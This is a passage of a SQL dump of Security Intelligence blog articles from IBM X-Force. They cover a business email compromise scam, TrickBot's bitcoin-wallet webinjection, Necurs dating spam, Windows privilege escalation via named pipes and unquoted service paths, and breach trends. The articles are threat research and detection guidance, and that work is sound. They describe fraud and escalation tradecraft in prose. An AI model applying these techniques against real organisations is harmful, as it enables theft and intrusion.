services industries, including Fortune 500 companies. The BEC scams identified by IBM incident responders consist of two separate but connected goals. The first is to harvest mass amounts of business user credentials, and the second is to use these credentials to impersonate their rightful owners and ultimately trick employees into diverting fund transfers to bank accounts the attackers control. To achieve the first goal, the attackers used credential sets they had already compromised to send a mass phishing email to the user’s internal and external contacts. The phish was often sent to several hundred contacts at a time and was engineered to look legitimate to the spammed contacts. The attacker used publicly available company information to craft a believable phish containing a link purported to lead to a business document. \n If the victim clicked the link, he or she was redirected to a fraudulent “DocuSign” portal requesting the user to authenticate via his or her email provider to download the referenced document. \n Neither the email nor the fraudulent “DocuSign” portals contain malware that is downloaded onto the user’s machine. To accomplish the second goal, the attackers focused on stolen credentials from companies that use single-factor authentication and an email web portal. For example, companies that only require a username and password for employees to access their Microsoft Office 365 accounts were compromised. Using email web portals ensured the attackers’ ability to complete these attacks online and without compromising the victim’s corporate network. The attackers specifically targeted personnel involved in the organization’s accounts payable departments to ensure that the victim had access to the company’s bank accounts. Before engaging with any employee, the attackers likely undertook a reconnaissance phase, looking through activity within the user’s email folders in search of subjects and opportunities to exploit and, eventually, creating or inserting themselves into relevant conversations. To successfully scam companies without special tools or malware, the attackers used sophisticated   tactics that prey on flaws in common accounts payable processes. X-Force IRIS assesses that the attackers carefully chose to impersonate vendors or associated companies with established relations to the client and target specific people in the organizational chart to increase the believability of the scam. According to X-Force IRIS incident responders, the attackers typically took a week between the point at which they gained initial access to a user’s email account and the time they started setting up the infrastructure to prepare a credible ruse. During this time, they likely conducted extensive research on the target’s organizational structure, specifically focusing on the finance department’s processes and vendors. The attackers also revitalized previous conversations with accounts payable personnel to learn any company-specific wire payment policies. The attackers’ thoroughness during reconnaissance and while financial conversations took place involved actions such as impersonating victims, finding and spoofing internal documents needed to make legitimate wire transfers, and setting up multiple domains and emails to pose as higher-level authorities. The attackers sent communications to targets directly from a compromised email address. To keep the victim unaware of the communications, the attackers created email rules to filter the emails out of the victim’s inbox. In other instances, the attackers used a typo-changed email address in the “reply to” field so the compromised user would not receive responses. If the receiver did not scrutinize the “reply-to” field, which often requires expanding the email header, the email would otherwise appear to come from a legitimate contact. The attackers also set up domains similar to the target company’s vendors, albeit with a hard-to-identify typo change — for example, doubling a letter of the company name in the URL or registering the vendor’s name with a different top-level domain (TLD), such as .net instead of .com. The domain names were then used to set up email accounts purporting to belong to known employees, and emails from those accounts were sent directly to the targets. In one example, the attackers registered a new domain to send fake approval messages impersonating different levels of the supervisory chain, including copying email signatures of the relevant business executives. Finally, although the attackers made some grammatical and colloquial mistakes, their English skills were proficient and the few mistakes they made could be easily overlooked by the target. The attackers created a false sense of reality around the target and imparted a sense of urgency to pay, resulting in successful scams involving millions of dollars. Since the attackers conducted correspondence from a victim user’s email, they created email rules to keep the victim unaware of the compromise. In cases in which the attackers impersonated the user, the attackers auto-deleted all emails delivered from within the user’s company. They likely did this to prevent the user from seeing any fraudulent correspondence or unusual messages in his or her inbox. Additionally, the attacker auto-forwarded email responses to a different email to read the responses without logging in to the compromised account. Separately, when attackers used   to send mass phishing emails, they simultaneously set up an email rule to filter all responses to the phish, undelivered messages, or messages containing words such as “hacked” or “email” to the user’s RSS feeds folder and marked them as read. X-Force IRIS incident responders noted that the threat actors had more financial success using shell corporations and corresponding bank accounts based in Hong Kong or China rather than using consumer bank accounts, in which cases financial institutions were more likely to delay or block large or unusual transactions. According to X-Force IRIS analysis, the shell corporations involved in the BEC scams were registered within the past year, some as recently as the same month that payments were requested to the account. According to the FBI, banks located in China and Hong Kong are the primary destinations for fraudulent wire transfers associated with BEC scams. Attackers are constantly honing their craft to create more believable scams and increase the difficulty in identifying falsified emails. Simply training employees on phishing threats and BEC scams is not always sufficient. Implementing key   and revisiting internal processes can help reduce the risk of being targeted by a low-tech social engineering campaign. The following IP addresses were observed in use by attackers launching  . X-Force IRIS researchers have not observed the same infrastructure being used between incidents. IBM X-Force analysis of spam honeypots found that 30 percent of the IPs below are also engaged in other malicious spam activity.', '\'Business Email Compromise (BEC)\', \'Fraud\', \'IBM X-Force Research\', \'Phishing\', \'Phishing Attacks\', \'Phishing Emails\', \'X-Force\'', 'https://securityintelligence.com/ibm-x-force-iris-uncovers-active-business-email-compromise-campaign-targeting-fortune-500-companies/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (44, 'TrickBot’s Cryptocurrency Hunger: Tricking the Bitcoin Out of Wallets', 'Ophir Harpaz', '2018-2-15', 'The TrickBot Trojan has been a rising   in the cybercrime arena ever since its  . The organized cybergang that operates TrickBot has been widening its scope of activity to dozens of countries across the globe. It has been targeting financial entities, such as banks and credit providers, and focusing on business and private banking as it aims for hefty fraudulent transfer bounties.\n But this is not where TrickBot’s diverse interests stop. As the value and popularity of cryptocurrency continues to rapidly rise, so does this cybergang’s interest in obtaining cryptocoins in the easiest way possible: theft. TrickBot configurations have featured popular cryptocurrency exchange URLs since about mid-2017, and we at IBM X-Force have been looking at the malware’s most recent attack schemes to steal coins from infected users.\n There are several types of cryptocurrency platforms, each offering a variety of services, such as trading one coin for another, transferring coins between different wallets and buying coins with a credit card. According to our analysis, TrickBot is actively targeting one such service that enables users to purchase bitcoin and bitcoin cash by credit card.\n The attacks we have looked into are facilitated by TrickBot’s webinjections, getting in the middle of the flow of a legitimate payment card transaction. In the normal payment scenario, a user looking to buy coins provides his or her public bitcoin wallet address and specifies the amount of bitcoin to purchase. When submitting this initial form, the user is redirected from the bitcoin exchange platform to a payment gateway on another domain, which is operated by a payment service provider. There, the user fills in his or her personal information, as well as credit card and billing details, and confirms the purchase of coins.\n This is where TrickBot hijacks the coins. This particular attack targets both the bitcoin exchange website and that of the payment service to grab the coins and route them to an attacker-controlled wallet.\n \n The inner workings of TrickBot’s cryptocoin attack rely on an existing TrickBot attack tactic: webinjections. This age-old favorite tool of many banking Trojans is a form of man-in-the-browser attack that enables malware to modify webpages presented to the user. Malware authors achieve this by placing hooks on key application programming interface (API) functions inside the browser. These hooks intercept information going from and back to the browser and alter it midway.\n The code that dictates which webpages should be attacked is usually not part of the malware’s executable code. Rather, it is in a configuration stored separately in the form of rules, each one defining which URL is to be modified and how. These rules usually contain large sections of malicious JavaScript code that is responsible for visually modifying the page, sending sensitive user information to the fraudulent server, etc.\n Unlike most financial malware, TrickBot does not expose the injected code in the configuration itself. Instead, a web URL of a remote command-and-control (C&C) server corresponds with every targeted URL. This modus operandi is called serverside webinjection and has been used by TrickBot since its launch in 2016. Serverside webinjections allow TrickBot to modify the injected code on its server in real time without having to update the configuration on the infected machine.\n To see the attack rules TrickBot has in store for any targeted site, we must first access the configuration. TrickBot keeps its configuration encrypted on the infected machine. To read it and unveil the list of targeted entities, one can either decrypt the configuration file or inspect it in the browser’s memory after the malware has already decrypted it.\n The relevant part of TrickBot’s configuration for this attack shows that the scheme involves two webpages that, together, make up the coin purchase process. The first is a page where the user provides his or her bitcoin wallet address and the desired amount of bitcoin to purchase. The second is a page where the payment process is executed.\n In the image below, we can see the exact set of rules in TrickBot’s configuration, each one matching a targeted page with a URL on TrickBot’s server. This way, TrickBot fetches the appropriate webinjection to alter the legitimate transaction and do its bidding instead.\n \n \n To enable it to control the infected machine’s web browser, TrickBot’s modules are injected into the browser ahead of time and already have hooks in place to launch webinjections.\n \n \n \n \n To view what was happening during the web session, we sniffed HTTP network traffic on the infected machine when opening the targeted URL. This revealed the attack flow of the malware’s dynamic injection method, which TrickBot refers to as “dinj.”\n For every resource that TrickBot wishes to replace — an HTML page, a JavaScript or a CSS file — an HTTP POST request is sent to the C&C server with the following   of that resource:\n One of the resources TrickBot replaced is the HTML code of the bitcoin website. The code is being switched up to gather data on the victim’s cryptocoin wallet and the number of coins to be purchased.\n Using Wireshark, we can see that the page is sent to TrickBot’s C&C and that a the attack server returned a modified version.\n \n \n \n \n To point out the injected script, we performed a simple diff between the original page source and the one returned by TrickBot’s C&C.\n \n \n The script first fetches an HTML element with ID “btcAddress.” This element is an input field in which the user fills in his or her wallet address. If this element is found on the page, the malware performs the following actions to alter the interaction with the targeted webpage:\n \n \n The injection into the HTML page is used only to collect information. The attacker can use this information — the legitimate user’s bitcoin wallet address and the bitcoin amount to purchase — to decide whether to proceed with a fraudulent operation.\n Later on, after being redirected to the payment process, TrickBot will gather more information. This is probably done to allow a future account takeover attack, which will enable the fraudsters to perform a purchase/coin transfer from a machine they control using the legitimate user’s wallet credentials and payment card details.\n The second phase of the TrickBot attack facilitates the theft of the cryptocoins by preying on the web logic defined by the payment provider for legitimate online transactions.\n The actual bitcoin theft is once again facilitated by a webinjection that modifies another resource of the site, “bundle.js,” which contains most of the payment processing logic.\n \n \n \n \n By checking the diff between the original version of bundle.js and the modified one, we noticed that the function sendPaymentRequest had been changed. This function is responsible for sending payment requests to the payment service provider, and it has been modified to contain a hardcoded bitcoin address instead of the one inserted by the user.\n \n \n The “walletaddress” attribute is the address of the bitcoin wallet to which the purchased coins will be delivered after the deal is complete. This injection ensures that the bitcoin will not be delivered to the original address provided by the victim, but to an address belonging to TrickBot’s operators.\n From this point on, the victim is led through several steps of identification in which he or she provides a phone number, an email address, a selfie photo with the credit card he or she wants to use, and a photo of his or her national ID card.\n However, these steps only serve to verify the personal identity and not the ownership of the wallet address. By now, the wallet address has already been set and will not be shown to the victim again. Thus, the victim’s credit card will be charged and he or she will believe the deal was successful, expecting to see the new coins in his or her wallet. The bitcoin will never reach the designated wallet, however, but will instead be delivered to a wallet belonging to one of TrickBot’s operators.\n Having researched the attack tactics TrickBot applied to this cryptocurrency coin theft, we can see that, while it relies on existing mechanisms, the scheme required extensive research of the targeted sites, their web logic and the security controls they use. It highlights what we already know about this malware gang: It continues to study new targets and expand its reach.\n As the theft of cryptocurrency becomes increasingly popular among financial malware operators, we expect to see a many more campaigns targeting platforms and service providers in the cryptocurrency sector.\n To mitigate the risk of financial malware, organizations can leverage the adaptive controls provided by  .\n In this study, we used a TrickBot sample with MD5  .', '\'Banking Malware\', \'Banking Trojan\', \'Bitcoin\', \'Bitcoin Mining\', \'Cryptocurrency\', \'Cryptocurrency Miner\', \'TrickBot\', \'Webinjection\'', 'https://securityintelligence.com/trickbots-cryptocurrency-hunger-tricking-the-bitcoin-out-of-wallets/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (45, 'Necurs Spammers Go All In to Find a Valentine’s Day Victim', 'Limor Kessem', '2018-2-12', 'Love is in the air — or, in this case, your spam folder. IBM X-Force observed a massive uptick from the Necurs botnet that is focused on dating spam. It started in mid-January 2018 and will continue as Valentine’s Day draws near. The   is notorious for its massive spam campaigns and is believed to control up to  . This botnet is best known for its ties to malware gangs that spread banking Trojans, such as Dridex and TrickBot, and ransomware such as Locky,   and  . But Necurs is not only about malware. Its operators dabble in distributing spam for other fraud endeavors as well, which brings to light this recent  . In 2017, X-Force observed Necurs sending mass amounts of pump-and-dump   designed to make recipients believe a penny stock was about to rise in value. Once enough people buy the stock and it actually rises in value, the scammers   to make a profit. The penny stock then drops back to its real market value, and those who bought it are often left with nothing but losses. In early 2018, the botnet was part of large  , and this latest bout of dating spam is yet another major campaign linking Necurs to shady online activity. Preying on seasonal trends is probably the top characteristic of email spam. The first quarter of the year typically plagues email recipients with   and romance scams that start arriving in January leading up to Valentine’s Day. The current campaign from Necurs reached over 230 million   within a matter of two weeks as the botnet spewed tens of millions of messages in two major bouts. The first surge started on Jan. 16 and ran through Jan. 18; the second started on Jan. 27 and died down on Feb. 3. \n Looking at the messages being sent out in excess of 30 million emails a day, the current campaign delivers short email blurbs from supposed Russian women living in the U.S. While typical spam email is notorious for bad spelling and grammar, these samples are rather well-worded. Each spam message comes from a disposable email address carrying the alleged writer’s name, but then asks the recipient to contact the writer back using another email address associated with another person’s name. \n Many of the messages indicated that the recipient had a profile on Facebook or Badoo, a dating-focused social network founded in 2006 by Russian entrepreneur  . Badoo is the   dating app in Russia, but it is also available internationally. Spam featuring messages from supposedly interested women is an old ploy. Such emails usually feature nothing more than basic text and are not likely to lure many people in. However, when it comes to spam, mass volume makes for a numbers game, and fraudsters only need a small percentage of recipients to reply. The threat actors behind this campaign will likely lure their victims to share revealing photos and extort them, ask for money to come visit or simply  . \n Overall, X-Force recorded over 230 million dating spam emails from the Necurs botnet, suggesting a capacity to distribute very large amounts of junk email. The spam was sent from roughly 950,000 different IP addresses. The top sender on the IP list was an address hosted via a Pakistani-based ISP. That IP address ( ) had been   655 times at the time of this writing and the IBM X-Force Exchange set its risk level at 10, the highest possible score. Together, Vietnam and India hosted 55 percent of the IPs from which the spam originated. It’s worth noting that spammers constantly shuffle the resources they leverage and the originating IPs logged in one campaign are not likely to be used in the next one. This is how fraudsters avoid blacklists and blocking. \n After the recent takedowns of the   and   botnets, Necurs is probably the   serving cybercriminals at this time. According to X-Force’s ongoing monitoring of Necurs’ activity, the botnet’s established status in the cybercrime world attracts both lower-grade spammers and   seeking to  . The operators of Necurs and other botnets have one goal: to get spam messages into people’s mailboxes without being filtered or blocked. These botnets often  , changing up the types of spam they spread and devising new ways to conceal it in varying file types and email ploys. As a result, spam from Necurs could find its way into both consumer and employee mailboxes. The best way to thwart these scams is to increase employee awareness about the types of malicious emails they should never open or respond to. For more tips to avoid spammers’ bait, read our   article.', '\'Advanced Threats\', \'Botnets\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Phishing\', \'Phishing Attacks\', \'Phishing Emails\', \'Spam Emails\', \'X-Force\'', 'https://securityintelligence.com/necurs-spammers-go-all-in-to-find-a-valentines-day-victim/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (46, 'No Rest for the Weary: Applying Security Lessons From 2017 in the New Year', 'Rueben Rodriguez', '2018-1-30', 'How can it be that we are already through January and moving into February of the new year? I don’t know about you, but I still have a long list of resolutions to accomplish and I need to focus on what I can realistically get done in 2018. This makes me think about how everyone in the security industry has been talking about   for 2018. However, we would be remiss not to look back at the security lessons we learned and the goals we collectively accomplished in 2017. To get a head start on the new year, we should reflect on these insights and apply them to the work we need to complete in 2018. So what happened in 2017 that required us to work harder and be more diligent than we thought possible? As an esteemed colleague of mine kindly reminded me, these “exercises” are simply “opportunities” to better our cybersecurity skills. As we in IBM Security, specifically the   team, take the time to look back, we can appreciate the hard work and collaboration that transpired to help make the world a safer place. Below are a few highlights and accomplishments we were proud to bring to the security industry last year. Even though we are proud of all the progress we made and security lessons we learned in 2017, we can’t afford to slack on our goals and resolutions for 2018. Bad actors will continue to attack our networks and exploit both known and unknown vulnerabilities. That’s why it is good to set achievable goals to ensure that we are doing everything we can to protect what is most important within our companies. It also means that, as a community of security professionals, we need to keep working together to spread security awareness and deal with whatever threats come our way. To learn more about how you can get ahead of the next cybercriminal trend, check out the   and start using it today.', '\'Cyberthreats\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Ransomware\', \'Threat Intelligence\', \'Threat Sharing\', \'Vulnerabilities\', \'X-Force\'', 'https://securityintelligence.com/no-rest-for-the-weary-applying-security-lessons-from-2017-in-the-new-year/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (47, 'Elevating Education on the Security and Resiliency Campus at Think 2018', 'Pamela Cobb', '2018-1-16', 'Earlier in my life, I used to think of Las Vegas much like everyone else that’s seen the “What happens in Vegas” ads: wild partying, befeathered showgirls and Elvis. I even entertained renewing my wedding vows in the Elvis Chapel there for my 10th anniversary, something my parents did for their 40th anniversary. I can safely say that I never anticipated associating Vegas with a place of learning, but I might be changing my mind due to Think 2018. Think is the new IBM conference, a behemoth that will overshadow all previous conferences. Taking place March 19–22, the event is a whole new way to get in touch with the best IBM has to offer, from   to seasoned security experts. It will help you tackle today’s most pressing security and business issues. \n You might be thinking, “How is Think 2018 different from other events such as InterConnect, World of Watson and Edge? It’s still in Vegas! Has IBM changed all that much?” Well, yes and no. We’re still showcasing transformational client stories, compelling use cases, and   from IBM and the industry in general, but we’ve implemented significant tweaks to improve the actual attendee experience, from food to session length to creature comforts. In the past, those of us with   loved to see the steps rack up as we dashed from one end of the conference hotel to the other, up stairs and down escalators, but it’s not the best attendee experience. This year, we’ve created centers of learning aligned to main IBM offering areas. The Security and Resiliency campus will host the core curriculum from IBM Security and our colleagues at Global Technology Services Resiliency Services. But that’s only one of the four campuses at the event. Think 2018 will also host Cloud by Data, Technology Infrastructure, and Business and AI campuses. On the Security and Resiliency campus, you’ll find our   in the main campus theater. This theater will feature 40-minute sessions on a range of topics, from infusing identity everywhere to building a  . After these core sessions, attendees can either break out into one of four Think Tanks to dive deep into a particular aspect of the topic or visit the activation area to see a hands-on demo. It’s worth noting that each campus also serves food whenever the campus is open, so no more worrying that you’ll miss a session because you need to grab a meal. The full range of our core topics are listed in the image below: Networking areas are scattered throughout the campuses to help make the most of peer-to-peer interactions during the day, or even during the Monday and Tuesday evening receptions. We also encourage attendees to make the most of user group meetings, where enthusiasts and users of IBM Security products come together to discuss best practices and share tips and tricks. The four campuses are complemented by Think Academy, where open labs, scheduled instructor-led labs and offering deep dives are held. This is also the place to go to get certified in any IBM product and get a leg up on learning. As you can tell, there’s a lot to take in at Think 2018. I encourage you to browse the  , check out the   to see some of the great sessions planned, and then dive in and register. If you want to learn more, including a sneak peek of some of the entertainment planned, you can also check out my  .', '\'IBM\', \'IBM Security\', \'resilience\', \'Security Conferences\', \'Think 2018 Conference\'', 'https://securityintelligence.com/elevating-education-at-think-2018-on-the-security-and-resiliency-campus/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (48, 'Identifying Named Pipe Impersonation and Other Malicious Privilege Escalation Techniques', 'Mutaz Alsallal', '2018-1-11', 'Privilege escalation is one of the key components of any attack that involves penetrating a system. If threat actors have limited access due to a current user’s privilege levels, they will naturally aim to escalate their privileges before expanding the scope of the attack. How can security professionals detect malicious escalation techniques before adversaries get a chance to compromise critical systems and sensitive data?\n There are several ways to do that, but let’s focus specifically on one of the tricks most commonly employed by malware developers and attackers: the named pipe impersonation technique.\n One of the most well-known penetration testing frameworks is called  . Although designed for testing purposes, attackers can — and often do — use concepts from this framework maliciously to escalate their privileges on a compromised host to a system account, which is a high-privilege account type on Windows-based endpoints.   is a technique used in the Metasploit platform to escalate these privileges.\n The legitimate named pipe technique is built into the Windows OS to facilitate communications between processes. The pipe technique uses a file to exchange messages between the two processes. For example, if one process wants to contact another, it can send a message over the network or by using a file, where one process writes the message to that file and the other one reads it.\n Pipes are also used by various malware codes for covert communications. In the  , for example, the malware reportedly spread through organizational networks. To move from one user to the next, it needed credentials, and it needed to obtain them stealthily. To do that, NotPetya typically started a new process to dump the victim’s credentials, and then used a named pipe to communicate between the NotPetya process and the credential-dumping process. This enabled it to covertly collect the dumped credentials.\n But what do we mean by impersonating a named pipe? How do attackers use it to escalate their privileges to a system account? This malicious action goes back to the concept of privilege levels.\n Let’s reflect by means of the following example: Let’s say I’m a service provider, you are my client and you ask me to execute a database query. As a provider, I may have full access to that database, but you, as a client, may have limited access that corresponds to the rights attributed to you as a user.\n Since you are a user/client, I can use your credentials to execute the query on your behalf — if your access rights allow you to perform that database query. You will then receive the results, also according to the rights level. If the results cannot be provided to you as a user, it could mean that you don’t have sufficient access.\n But what if you, as the client, somehow have higher privileges than the service provider? You can pass those escalated rights to the service provider by letting it use privileged credentials. In such a case, what if the provider should impersonate or abuse the client’s privileged account to perform malicious activities?\n The same idea can be applied in the named pipe context. If a process creates a pipe, this process will be the pipe owner or the pipe server. When another process connects to this pipe, it will be called the pipe’s client. Once connected, the pipe server can use the pipe client’s privilege level, the client’s security context or the client’s access rights. This is a Windows feature that helps perform activities based on the client’s privileges, since the server may have full access, but the client typically has more limited rights.\n This feature can be exploited by creating a pipe server with limited or low privileges and then attempting to connect a much more privileged client to that pipe server. When that happens, the pipe server can abuse the client’s elevated privileges to perform activities based on those access rights.\n Metasploit facilitates and automates the abusing process and allows penetration testers to perform it by executing a single command. Behind the scenes, the tool creates a pipe server with limited privileges, then configures a Windows service (the client) to connect to that pipe.\n The tool commonly used to test the potential of impersonating a pipe is the Metasploit Meterpreter module.   is a modular part of the Metasploit penetration testing framework. It is an advanced, dynamically extensible payload that uses in-memory Dynamic Link Library (DLL) injection stagers and is extended over the network at runtime. This tool is typically used in schemes that bear on communications between Windows processes, which makes it useful to an attacker looking to impersonate a legitimate named pipe.\n Now let’s say a threat actor executes a malicious process called myLove.exe under user MARY, who has limited privileges on the compromised host. This malicious process will connect back to the attacker’s host and can allow the threat actor to remotely execute other commands via MARY.\n The malicious process starts out with MARY’s limited privileges, but the attacker’s goal is to escalate his or her privileges from MARY’s level to a system-level user. By executing a getsystem command, myLove.exe will create a pipe with a random name. In our example, that random name was “dqwfqx,” but it could have been another name as well. This pipe is originally created with MARY’s user privilege level.\n \n By executing a getsystem command, myLove.exe will create a pipe with a random name. In our example, that random name was “dqwfqx,” but it could have been another name as well. This pipe is originally created with MARY’s user privilege level.\n <img title=\"a windows sysmon event indicating a pipe has been created\" src=\"https://securityintelligence.com/wp-content/uploads/2018/01/figure-2-a-windows-sysmon-event-indicating-a-pipe-has-been-created.png\" alt=\"A Windows Sysmon e The attacker’s challenge now is to convince a client with system-level privileges to connect to the new pipe. This is not hard to achieve, since Windows services can run as a system user and the attacker can install a new service or reconfigure an existing one to send any message to the named pipe “dqwfqx.”\n \n The Windows Registry event shown below indicates that a service was installed and configured to connect to the named pipe “dqwfqx.”\n \n When the service starts, this time it launches cmd.exe as a system-level user and connects to a pipe created by MARY, which now leads to a system-level client connecting to a pipe server that was created by a lower-privileged user.\n \n This malicious activity may happen relatively smoothly, but it can be detected by using an   to look for a pipe creation event followed by a service that connects to the same pipe.\n \n This approach can be expanded by creating or modifying a scheduled task to connect to a lower-privilege pipe. In general, it’s important to check whether any service or scheduled task is configured to connect to a pipe and to examine the underlying activity’s source.\n There are many ways in which attackers can exploit misconfigured services to conduct privilege escalation schemes. Below are some of the most prominent ones I have worked with in the past year, as well as some tips that can be useful in detecting them.\n One of the easiest techniques to escalate privileges is to look for any service with an unquoted executable file location. For example, if we have a service and the service binary file is located in C:\\users\\MyCompanyService\\myService.exe, then Windows will try to locate the service binary file and execute the following files:\n If an attacker can place a malicious file with the name my.exe in C:\\users\\my.exe, he or she may be able to escalate to the service user’s privileges during the next service restart. The Windows OS service will start to search for the service executable file after a reboot and, while doing that, will execute the malicious file my.exe.\n A proactive way to identify this type of activity is to use rules to detect any new service with an unquoted binary file location. Another great technique is to baseline or profile the processes that can run at the endpoint level and then check for any new unknown processes.\n It’s also important to profile and baseline the processes that can run with system-level privileges to trigger an offense in cases where any new process attempts to run with system user privileges. This enables the security team to detect any privilege escalation attempts, even if a   is being used.\n Attackers can also abuse the permissions assigned to the service executable folder, since a poorly written access control list (ACL) may allow local users to add or override these files. Threat actors can look for a service configured to run with higher user privileges. If they can override the service binary executable file with another malicious service executable file, then they can escalate their privileges to the service user level.\n Security professionals can detect this technique by profiling and mapping the process name to the  . This enables security teams to identify known processes that start with unknown or unseen hashes.\n A misconfigured permission may allow a local user to change service attributes or reconfigure a service, which can allow an attacker to change the service binary location to another malicious executable. A common technique is to change the service binary location to a set of commands to add a new or existing user to the local administrators group. This can enable the attacker to escalate his or her limited privileges by hijacking the new admin user.\n Security teams can detect such activity by looking for a service binary executable change followed by the addition of a new user to the admin group. They can also profile the service binary file attributes (e.g., name, hash), then trigger an offense if a known service starts with a new attribute (e.g., a new binary file hash or a different location for the service binary file).\n In most privilege escalation attacks, threat actors attempt to get a command line with the highest privileges possible. In Windows, a highly privileged user is the system user. Normal endpoint users and even Windows administrators do not launch command lines as system-level users, so determining whether a command line is launched as a system user is a good place to start when it comes to detecting various  .\n In a typical attack that uses Metasploit, attackers launch a command line as a system user after escalating their privileges. They may also opt to use legitimate Windows utilities, such as  , which would help them execute processes as a system user on a local or remote machine.\n Monitoring for command lines launched with system privileges is a great method to detect malicious processes. Another good approach is to profile the processes that can run as system and trigger an alert when a new unseen or unknown system-level process starts. View the   for a list of legitimate Windows processes that do start with system-level privileges.\n \n Privilege escalation activity is often a precursor to a potentially devastating data breach involving the enterprise’s most sensitive data. Detecting the above techniques before they cause harm and using well-managed   to monitor pipe creation events and other suspicious activity, security professionals can save their organizations time, money and negative headlines.', '\'Access Management\', \'Identity and Access Management (IAM)\', \'Privileged Access\', \'Privileged Identity Management (PIM)\'', 'https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (49, 'Six Major Data Breach Trends From 2017', 'Jason Kravitz', '2018-1-8', 'It seems like the moment the security industry collectively comes to grips with the latest publicly disclosed data breach, another bigger and badder security incident surfaces to shake it up, prompting many enterprises to worry if the same could happen to them. Fortunately, by tapping into the overarching themes and patterns of these recent breaches, organizations can unlock insights to help them avoid becoming part of the breach news cycle. IBM X-Force identified six major trends from over 235 publicly disclosed breaches it tracked in 2017. Some are trends that we’ve been highlighting for years, such as   and failure to patch. Others are newer, growing trends, such as hijacked thingbots, misconfigured cloud servers and cryptocurrency-targeted attacks. \n The security incidents described below represent only a few examples of each attack trend, which are listed in no particular order, and suggested mitigation tips, several of which fall under  . We all have an opportunity to learn from these incidents, and security professionals should pay close attention to notable trends, since they may indicate areas of possible concern in their own environments. \n What happens when millions of systems are exploited by a gaping remote vulnerability and then used as a botnet of zombie devices to launch distributed denial-of-service (DDoS) attacks or infect unsuspecting users with malware? In August 2017, a consortium of six technology firms came together to  , a botnet comprised of tens of thousands of compromised Android devices that were being used to launch crippling DDoS attacks against targets in the hospitality industry. These vulnerable systems had been infected by more than 300 seemingly benign apps from the official Google Play store, including video players, file managers and ringtones. All these apps contained hidden code that could be activated for malicious use. Threat such as the  , which turned hundreds of thousands of connected cameras and DVR devices into DDoS bots in November 2016 and   toward the end of 2017, use the ability to commandeer a huge number of systems as a devastatingly effective attack tactic. In September 2017, Armis Labs disclosed a Bluetooth vulnerability dubbed   that could be exploited to silently take over any affected device within proximity of an attacker, potentially exposing billions of systems to compromise. Malware that launches DDoS attacks or hijacks a device’s CPU to   can actually damage the hardware, since these devices were not made to sustain such high utilization. In December 2017, security researchers discovered that the prolonged execution of the CPU-intensive   caused the battery in their test Android phone to bulge out and deform the case. All devices in your environment have the potential to become bots, including mobile devices. The time to begin identifying which IT assets could potentially be incorporated into botnet is not when a cybergang is actively using your devices to launch DDoS attacks. Organizations should consider managing the life cycle and inventory of assets through an   program that also includes  . The more these rising numbers of devices and endpoints use common libraries, platforms and operating systems, the more susceptible they are to the exploitation of a single vulnerability. In other words, aggregated risk goes through the roof in this scenario. The availability and growing ease of implementing scalable systems and architecture can lead to other problems as well. Near close of business in Europe on Friday, May 12, 2017, a massive malware outbreak dubbed   dumped ransomware onto Windows endpoints at hospitals, internet service providers (ISPs) and other critical targets. As IT professionals around the world scrambled to ensure that they were protected, it became evident that the worm was propagating via a Server Message Block (SMB) vulnerability, which had been patched by Microsoft (MS17-010) more than two months earlier. Similarly,  , another worm, used the same SMB vulnerability to propagate. Widespread worms, such as Blaster and Sasser, were more common in the early 2000s, but seemed to have gone out of style as other types of attacks took form. Still, they illustrate the importance of keeping systems patched. Remediating critical unpatched vulnerabilities is key, so timely patch management is vital to organizations of any size. While advanced   can be a formidable threat, they are more often the stuff of fear and legend. In fact, according to the IBM X-Force vulnerability database, less than 1 percent of vulnerabilities in 2016 were considered zero-day vulnerabilities — that is, flaws exploited in the wild for which patches do not exist. Failure to patch existing critical vulnerabilities is most often the cause of havoc on a global scale, particularly when there is a huge number of vulnerable endpoints. Cloud services enable companies to easily store millions of user data records for websites and apps. While vendors generally do a good job of securing these services, user error, misconfiguration and malicious insiders can publicly expose this data without providing any form of authentication. This year alone, there have been numerous cases of misconfigured Amazon S3 buckets, Rsync backups, MongoDB databases and other similar services that exposed private, sensitive data. In July 2017, a third-party vendor that provided customer support services to a major telecommunications company   belonging to 14 million customers on a wide-open Amazon S3 cloud server. The data included custom personal identification numbers (PINs), which could be used to authenticate customer accounts. As consumers, we download apps and services without much consideration for how they use or store our data. In one   from November, security researchers uncovered a publicly accessible 577 GB   from an Israeli company that sells a keyboard app for mobile phones. The data not only contained usernames and emails addresses, but also location-based GPS information for users and transcripts of text that was typed into phones via the keyboard app. The year closed with a massive leak affecting 123 million Americans after a   allowed AWS Authenticated Users — that is, any user that has an Amazon AWS account — to download the stored data. This type of data is valuable to attackers, who can use it to target specific individuals and companies through spear phishing.  leaked over 2 billion records in 2017. According to IBM X-Force, server misconfigurations made up 70 percent of the total number of reported leaked records this past year. It’s important for organizations to conduct proper risk assessments of their cloud deployments. Security professionals should consider periodically engaging a professional   to map vulnerabilities and inadvertent access issues. Leaked data can have immense monetary value, especially when someone is willing to pay to keep it private. As we’ll see in the next trend, attackers have homed in on new targets to exploit and extort to make money. In late April 2017, a popular video streaming service was informed that new episodes of one of its most popular shows had been   that provided postproduction services for the show. The threat actor also stole several other shows that had yet to be released and threatened to leak the files to the public if a ransom was not paid. A similar   emerged later in the year involving the theft of episodes from another popular show. In addition, several plastic surgery clinics were breached this year, including one in   and one in  , both of which catered to celebrity clients. Given the sensitive nature of photos and patient history, high-profile targets such as these are particularly vulnerable. Whether they’re going after medical records, private dating preferences, intellectual property or hot television series, attackers are targeting high-value data in attempts to earn cash through good old-fashioned extortion. Imagine that your data has been stolen from a third party with which you do business and is now being held for ransom. What is your game plan? Do you have outside counsel, crisis communications and   on retainer to provide guidance? Do you have a contact in law enforcement to disclose the breach to? How will you respond to the ransom demands? How will you address your customers and the media? An organization’s response to a breach 